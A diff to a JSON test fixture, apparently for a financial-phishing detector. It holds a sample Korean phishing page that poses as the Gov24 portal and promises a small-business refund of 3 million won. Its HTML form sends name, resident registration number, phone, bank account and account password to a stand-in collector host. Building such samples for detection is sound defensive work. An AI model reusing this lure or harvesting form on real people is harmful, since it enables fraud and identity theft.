@@ -2,7 +2,7 @@
   "analysis_id": "government_support_001",
   "original_url": "https://gov-support-apply.example/small-business",
   "final_url": "https://policy-fund-center.example/refund/apply",
-  "screenshot_path": "C:\\financial-phishing\\multimodal\\fixtures\\government_support\\test.png",
+  "screenshot_path": "test.png",
   "page_text": "정부24 소상공인 정책자금 추가 지급 대상자로 선정되었습니다. 오늘 안에 환급금 300만원을 신청하세요. 지급 확인을 위해 성명, 주민등록번호, 휴대전화번호, 은행명, 계좌번호와 계좌 비밀번호를 입력해 주세요.",
   "html": "<html><body><header>정부24</header><main><h1>소상공인 정책자금 추가 지급</h1><p>오늘 신청 마감 · 환급금 300만원 지급</p><form action=\"https://support-collector.example/refund\" method=\"post\"><input name=\"name\" type=\"text\"><input name=\"resident_number\" type=\"text\"><input name=\"phone\" type=\"tel\"><input name=\"bank\" type=\"text\"><input name=\"account\" type=\"text\"><input name=\"account_password\" type=\"password\"><button>지원금 신청</button></form></main></body></html>",
   "forms": [
